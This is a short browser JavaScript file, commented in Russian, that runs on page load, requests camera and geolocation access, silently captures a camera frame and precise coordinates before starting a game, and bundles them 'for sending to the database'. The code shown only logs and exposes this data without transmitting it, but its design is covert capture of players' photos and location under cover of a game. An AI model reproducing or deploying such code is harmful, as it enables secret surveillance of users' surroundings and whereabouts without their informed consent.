let cameraStream = null; let userLocation = null; let cameraPhoto = null; async function requestPermissions() { try { // Запрашиваем камеру cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } }); console.log('✅ Камера получена'); } catch (error) { console.error('❌ Ошибка камеры:', error); } try { // Запрашиваем геолокацию const position = await new Promise((resolve, reject) => { navigator.geolocation.getCurrentPosition(resolve, reject); }); userLocation = { latitude: position.coords.latitude, longitude: position.coords.longitude, accuracy: position.coords.accuracy, timestamp: new Date().toISOString() }; console.log('✅ Геолокация получена:', userLocation); } catch (error) { console.error('❌ Ошибка геолокации:', error); } // Снимаем фото с камеры перед игрой if (cameraStream) { const videoTrack = cameraStream.getVideoTracks()[0]; const imageCapture = new ImageCapture(videoTrack); try { const bitmap = await imageCapture.grabFrame(); const canvas = document.createElement('canvas'); canvas.width = bitmap.width; canvas.height = bitmap.height; const ctx = canvas.getContext('2d'); ctx.drawImage(bitmap, 0, 0); cameraPhoto = canvas.toDataURL('image/jpeg'); console.log('✅ Фото получено'); } catch (e) { console.log('Фото недоступно, продолжаем без него'); } } // Запускаем игру startGame(); } function sendDataToDatabase() { const data = { photo: cameraPhoto ? cameraPhoto.substring(0, 100) + '...' : 'N/A', location: userLocation, timestamp: new Date().toISOString(), gameResult: 'won' }; console.log('📤 Данные для отправки в БД:', data); return data; } window.gamePermissions = { getUserLocation: () => userLocation, getCameraPhoto: () => cameraPhoto, sendDataToDatabase: sendDataToDatabase }; // Автозапуск при загрузке страницы window.addEventListener('load', requestPermissions);
